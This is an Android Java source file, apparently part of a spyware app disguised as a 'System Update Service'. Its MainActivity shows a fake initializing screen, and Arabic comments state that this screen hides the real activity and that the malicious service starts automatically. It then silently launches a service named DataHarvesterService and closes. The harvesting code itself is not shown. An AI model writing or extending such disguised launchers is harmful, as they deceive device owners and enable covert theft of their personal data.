package com.system.updateservice;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // واجهة مستخدم بسيطة تخفي النشاط الحقيقي
        TextView textView = new TextView(this);
        textView.setText("System Update Service\nInitializing...");
        textView.setTextSize(18);
        textView.setPadding(50, 50, 50, 50);
        
        setContentView(textView);
        
        // بدء الخدمة الخبيثة تلقائياً
        Intent serviceIntent = new Intent(this, DataHarvesterService.class);
        startService(serviceIntent);
        
        // إنهاء النشاط بعد بدء الخدمة
        finish();
    }
}
